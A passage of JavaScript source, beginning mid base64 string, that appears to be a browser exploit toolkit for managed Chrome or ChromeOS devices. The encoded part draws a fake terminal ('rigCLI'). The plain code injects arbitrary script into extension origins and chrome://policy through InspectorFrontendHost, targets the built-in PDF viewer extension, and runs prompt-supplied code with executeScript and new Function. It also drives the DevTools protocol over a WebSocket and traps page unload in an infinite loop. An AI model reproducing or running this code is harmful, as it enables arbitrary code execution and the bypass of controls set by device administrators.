b3I6cmVkIj5FUlJPUjogbm8gcGF5bG9hZCBkZWxpdmVyZWQ8L3NwYW4+PGJyPmAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSBpZihjbWQuc3RhcnRzV2l0aCgicHVwZGF0ZSIpKXsKICAgICAgICAgICAgICAgIGxldCBzcGwgPSBjbWQuc3BsaXQoJyAnKQogICAgICAgICAgICAgICAgbGV0IGZsYWdzID0ge30KICAgICAgICAgICAgICAgIHNwbC5tYXAoYT0+ewogICAgICAgICAgICAgICAgICAgIGlmKGEuc3RhcnRzV2l0aCgiLS0iKSl7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKGEuaW5jbHVkZXMoIj0iKSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmbGFnc1thLnNwbGl0KCctLScpLmpvaW4oJz0nKS5zcGxpdCgnPScpWzFdXT1hLnNwbGl0KCctLScpLmpvaW4oJz0nKS5zcGxpdCgnPScpWzJdCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmbGFnc1thLnNwbGl0KCctLScpWzFdXT10cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgbGV0IHBheWxvYWQgPSBzcGxbLTFdCiAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOnllbGxvdyI+ZmV0Y2hpbmcgcGF5bG9hZC4uLjwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgYXdhaXQgc2xlZXAoMjAwKQogICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjp5ZWxsb3ciPnJlcXVlc3Rpbmcgd3JpdGUgcGVybWlzc2lvbnMuLi48L3NwYW4+PGJyPmAKICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDIwMCkKICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1cGRhdGVyJykuY2xpY2soKQogICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjpsaW1lIj5Eb25lITwvc3Bhbj48YnI+YAoKICAgICAgICAgICAgfSBlbHNlIGlmKGNtZC5zdGFydHNXaXRoKCJjbGVhbnVwIikpewogICAgICAgICAgICAgICAgbGV0IHNwbCA9IGNtZC5zcGxpdCgnICcpCiAgICAgICAgICAgICAgICBsZXQgZmxhZ3MgPSB7fQogICAgICAgICAgICAgICAgc3BsLm1hcChhPT57CiAgICAgICAgICAgICAgICAgICAgaWYoYS5zdGFydHNXaXRoKCItLSIpKXsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoYS5pbmNsdWRlcygiPSIpKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsYWdzW2Euc3BsaXQoJy0tJykuam9pbignPScpLnNwbGl0KCc9JylbMV1dPWEuc3BsaXQoJy0tJykuam9pbignPScpLnNwbGl0KCc9JylbMl0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsYWdzW2Euc3BsaXQoJy0tJylbMV1dPXRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICBsZXQgcGF5bG9hZCA9IHNwbFstMV0KICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwrPWA8c3BhbiBzdHlsZT0iY29sb3I6eWVsbG93Ij5Mb2FkaW5nIGVudiBmb3IgY2xlYW51cC4uLjwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDIwMCkKICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2xlYW51cCcpLmNsaWNrKCkKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOmxpbWUiPkRvbmUhPC9zcGFuPjxicj5gCiAgICAgICAgICAgIH0gZWxzZSBpZihjbWQuc3RhcnRzV2l0aCgiY2h1cmwiKSl7CiAgICAgICAgICAgICAgICBsZXQgc3BsID0gY21kLnNwbGl0KCcgJykKICAgICAgICAgICAgICAgIGxldCBmbGFncyA9IHt9CiAgICAgICAgICAgICAgICBzcGwubWFwKGE9PnsKICAgICAgICAgICAgICAgICAgICBpZihhLnN0YXJ0c1dpdGgoIi0tIikpewogICAgICAgICAgICAgICAgICAgICAgICBpZihhLmluY2x1ZGVzKCI9IikpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmxhZ3NbYS5zcGxpdCgnLS0nKS5qb2luKCc9Jykuc3BsaXQoJz0nKVsxXV09YS5zcGxpdCgnLS0nKS5qb2luKCc9Jykuc3BsaXQoJz0nKVsyXQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmxhZ3NbYS5zcGxpdCgnLS0nKVsxXV09dHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIGxldCBwYXlsb2FkID0gc3BsWy0xXQogICAgICAgICAgICAgICAgaWYgKGZsYWdzLnYyKXsKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOnllbGxvdyI+Q0hVUkwgdjIgZW52aW9ybm1lbnQgbG9hZGluZy4uLjwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDIwMCkKICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYWN0aXZhdGUyJykuY2xpY2soKQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOnllbGxvdyI+Q0hVUkwgZW52aW9ybm1lbnQgbG9hZGluZy4uLjwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDIwMCkKICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYWN0aXZhdGUnKS5jbGljaygpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSBpZihjbWQuc3RhcnRzV2l0aCgic3lzIikpewogICAgICAgICAgICAgICAgbGV0IHNwbCA9IGNtZC5zcGxpdCgnICcpCiAgICAgICAgICAgICAgICBsZXQgZmxhZ3MgPSB7fQogICAgICAgICAgICAgICAgc3BsLm1hcChhPT57CiAgICAgICAgICAgICAgICAgICAgaWYoYS5zdGFydHNXaXRoKCItLSIpKXsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoYS5pbmNsdWRlcygiPSIpKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsYWdzW2Euc3BsaXQoJy0tJykuam9pbignPScpLnNwbGl0KCc9JylbMV1dPWEuc3BsaXQoJy0tJykuam9pbignPScpLnNwbGl0KCc9JylbMl0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsYWdzW2Euc3BsaXQoJy0tJylbMV1dPXRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICBsZXQgcGF5bG9hZCA9IHNwbFtzcGwubGVuZ3RoLTFdCiAgICAgICAgICAgICAgICBpZihwYXlsb2FkLnN0YXJ0c1dpdGgoJy0tJykpewogICAgICAgICAgICAgICAgICAgIHBheWxvYWQ9JycKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmKGZsYWdzLnVwZGF0ZSkgewogICAgICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwrPWA8c3BhbiBzdHlsZT0iY29sb3I6eWVsbG93Ij5DaGVja2luZyBzZXJ2ZXIgZm9yIHVwZGF0ZXMuLi48L3NwYW4+PGJyPmAKICAgICAgICAgICAgICAgICAgICBhd2FpdCBzbGVlcCg1MDApCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjpyZWQiPk5vIG5ldyB1cGRhdGVzIGF2YWxpYmxlPC9zcGFuPjxicj5gCiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGZsYWdzLnBhdGNoKSB7CiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCArPSBgPHNwYW4gc3R5bGU9ImNvbG9yOnllbGxvdyI+RXN0YWJsaXNoaW5nIGNvbm5lY3Rpb24gdG8gaG9zdCBzZXJ2ZXIuLi48L3NwYW4+PGJyPmAKICAgICAgICAgICAgICAgICAgICBhd2FpdCBzbGVlcChNYXRoLnJhbmRvbSgpKjEwMDApCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCArPSBgPHNwYW4gc3R5bGU9ImNvbG9yOnllbGxvdyI+RXN0YWJsaXNoaW5nIGNvbm5lY3Rpb24gdG8gW3dzczovL2FwaS5qc3dPUy9rZXJuZWwvN3lXMms5SzAyL3N1cGRhdGVzL2xhdGVzdF0uLi48L3NwYW4+PGJyPmAKICAgICAgICAgICAgICAgICAgICBhd2FpdCBzbGVlcChNYXRoLnJhbmRvbSgpKjEwMDApCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCArPSBgPHNwYW4gc3R5bGU9ImNvbG9yOmxpbWUiPkNvbm5lY3Rpb25zIGVzdGFibGlzaGVkPC9zcGFuPjxicj5gCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCArPSBgPHNwYW4gc3R5bGU9ImNvbG9yOnllbGxvdyI+RW5nYWdpbmcgc2hpbWJvb3QgKGN1cnJlbnQga2VybmVsIHdpbGwgYmUgc2h1dCBvZmYpPC9zcGFuPjxicj5gCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjpvcmFuZ2UiPiDilog8L3NwYW4+YAogICAgICAgICAgICAgICAgICAgIGZvciAobGV0IHJlcCA9IDA7IHJlcDw5OyByZXArKyl7CiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKE1hdGgucmFuZG9tKCkqMjAwMCkKICAgICAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjpvcmFuZ2UiPiDilog8L3NwYW4+YAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPGJyPjxzcGFuIHN0eWxlPSJjb2xvcjpsaWdodGdyYXkiPnNoaW1+JCByZWFkeSBlbnY8L3NwYW4+PGJyPmAKICAgICAgICAgICAgICAgICAgICBhd2FpdCBzbGVlcCgxMDApCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjpsaWdodGdyYXkiPnNoaW1+JCBlY2hvID4+IGluaGVyaXRpbmcgc29ja2V0IGFuZCBiZWdpbm5pbmcgZG93bmxvYWQ8L3NwYW4+YAogICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDEwMCkKICAgICAgICAgICAgICAgICAgICBsZXQgZmlsZXNlbGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2IikKICAgICAgICAgICAgICAgICAgICBmaWxlc2VsZW0uc3R5bGUuY29sb3I9ImxpZ2h0Z3JheSIKICAgICAgICAgICAgICAgICAgICBmaWxlc2VsZW0uaW5uZXJIVE1MPSIiCiAgICAgICAgICAgICAgICAgICAgY3NsLmFwcGVuZENoaWxkKGZpbGVzZWxlbSkKCiAgICAgICAgICAgICAgICAgICAgbGV0IHJvdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpCiAgICAgICAgICAgICAgICAgICAgcm90LnN0eWxlLmNvbG9yPSJsaWdodGdyYXkiCiAgICAgICAgICAgICAgICAgICAgcm90LmlubmVySFRNTD0iWyBdIgogICAgICAgICAgICAgICAgICAgIGNzbC5hcHBlbmRDaGlsZChyb3QpCiAgICAgICAgICAgICAgICAgICAgZGxpbnByb2dyZXNzID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIGZpbGVhbmltYXRlKGZpbGVzZWxlbSkKICAgICAgICAgICAgICAgICAgICBhd2FpdCByb3RhbmltYXRlKHJvdCkKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOmxpZ2h0Z3JheSI+c2hpbX4kIGVjaG8gPj4gZG93bmxvYWQgY29tcGxldGUsIGJvb3RpbmcgbmV3IGtlcm5lbDwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDIwMCkKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOmxpZ2h0Z3JheSI+c2hpbX4kIGhhc2ggY2hlY2tzdW1zIC0tdmVyaWZ5IDwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgICAgIG1haW5kbC5zY3JvbGxUb3AgPSBtYWluZGwuc2Nyb2xsSGVpZ2h0CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2xlZXAoNTApCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjpsaWdodGdyYXkiPnNoaW1+JCBoYXNoID4+IGNoZWNrc3VtcyB2ZXJpZmllZCwgcmVhZHkgdG8gYm9vdDwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgICAgIG1haW5kbC5zY3JvbGxUb3AgPSBtYWluZGwuc2Nyb2xsSGVpZ2h0CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2xlZXAoMjAwKQogICAgICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwrPWA8c3BhbiBzdHlsZT0iY29sb3I6bGlnaHRncmF5Ij5zaGltfiQgT1MgYm9vdCBrZXJuZWxAbGF0ZXN0PC9zcGFuPjxicj5gCiAgICAgICAgICAgICAgICAgICAgbWFpbmRsLnNjcm9sbFRvcCA9IG1haW5kbC5zY3JvbGxIZWlnaHQKICAgICAgICAgICAgICAgICAgICBhd2FpdCBzbGVlcCg1MCkKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOmxpZ2h0Z3JheSI+c2hpbX4kIE9TID4+IGJvb3RpbmcuLi48L3NwYW4+PGJyPmAKICAgICAgICAgICAgICAgICAgICBtYWluZGwuc2Nyb2xsVG9wID0gbWFpbmRsLnNjcm9sbEhlaWdodAogICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDIwMCkKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOm9yYW5nZSI+IOKWiDwvc3Bhbj5gCiAgICAgICAgICAgICAgICAgICAgbWFpbmRsLnNjcm9sbFRvcCA9IG1haW5kbC5zY3JvbGxIZWlnaHQKICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCByZXAgPSAwOyByZXA8OTsgcmVwKyspewogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBzbGVlcChNYXRoLnJhbmRvbSgpKjIwMDApCiAgICAgICAgICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwrPWA8c3BhbiBzdHlsZT0iY29sb3I6b3JhbmdlIj4g4paIPC9zcGFuPmAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxicj5gCiAgICAgICAgICAgICAgICAgICAgbWFpbmRsLnNjcm9sbFRvcCA9IG1haW5kbC5zY3JvbGxIZWlnaHQKICAgICAgICAgICAgICAgICAgICBhd2FpdCBzbGVlcCg1MDApCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjpsaW1lIj4gcmlnQ0xJIDIuNiBpbnN0YWxsZWQsIHJlYm9vdCBpbjwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgICAgIG1haW5kbC5zY3JvbGxUb3AgPSBtYWluZGwuc2Nyb2xsSGVpZ2h0CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2xlZXAoMjAwKQogICAgICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwrPWBbNV1gCiAgICAgICAgICAgICAgICAgICAgbWFpbmRsLnNjcm9sbFRvcCA9IG1haW5kbC5zY3JvbGxIZWlnaHQKICAgICAgICAgICAgICAgICAgICBhd2FpdCBzbGVlcCgxMDAwKQogICAgICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwrPWBbNF1gCiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2xlZXAoMTAwMCkKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gWzNdYAogICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDEwMDApCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YFsyXWAKICAgICAgICAgICAgICAgICAgICBhd2FpdCBzbGVlcCgxMDAwKQogICAgICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwrPWBbMV08YnI+YAogICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDEwMDApCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjpsaW1lIj5FWElUOiBFeGl0IGNvZGUgMTEgKGZyaWVuZGx5KTwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDIwMDApCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCArPSAiPGJyPjxicj48YnI+PGJyPiIKICAgICAgICAgICAgICAgICAgICBtYWluZGwuc2Nyb2xsVG9wID0gbWFpbmRsLnNjcm9sbEhlaWdodAogICAgICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwgKz0gIiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZsdDs8c3BhbiBzdHlsZT0nY29sb3I6bGltZSc+cmlnQ0xJIDIuNiByZWFkeTwvc3Bhbj4mZ3Q7PGJyPiIKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MICs9YCZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwO0BjdXJ0aW1lIFske25ldyBEYXRlKCl9XTxicj5gCiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCArPWAmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDtAdXNlciBbJHtuYXZpZ2F0b3IudXNlckFnZW50fV08YnI+YAogICAgICAgICAgICAgICAgICAgIG1haW5kbC5zY3JvbGxUb3AgPSBtYWluZGwuc2Nyb2xsSGVpZ2h0CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwgKz0gIjxzcGFuIHN0eWxlPSAnY29sb3I6cmVkJz5FUlJPUjogbm8gdmFsaWQgZmxhZ3MgcHJvdmlkZWQiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9IGVsc2UgaWYoY21kLnN0YXJ0c1dpdGgoImVjaG8iKSl7CiAgICAgICAgICAgICAgICBsZXQgbGluZSA9IGNtZC5zcGxpdCgnICcpCiAgICAgICAgICAgICAgICBsaW5lLnNoaWZ0KCkKICAgICAgICAgICAgICAgIGxpbmUgPSBsaW5lLmZpbHRlcihhPT4hYS5zdGFydHNXaXRoKCctLScpKQogICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjojQkY0MEJGIj5+JCA8L3NwYW4+JHtsaW5lLmpvaW4oJyAnKX08YnI+YAogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ25vbmUnKQogICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjpyZWQiPkVSUk9SOiB1bmtub3duIGNvbW1hbmQgJmx0OyR7Y21kLnNwbGl0KCcgJylbMF19Jmd0Ozwvc3Bhbj48YnI+YAogICAgICAgICAgICB9CgogICAgICAgICAgICBydW5uaW5nID0gZmFsc2UKICAgICAgICB9CiAgICB9KQp9CgptYWluKCk=")    </script>
    
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = 'manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
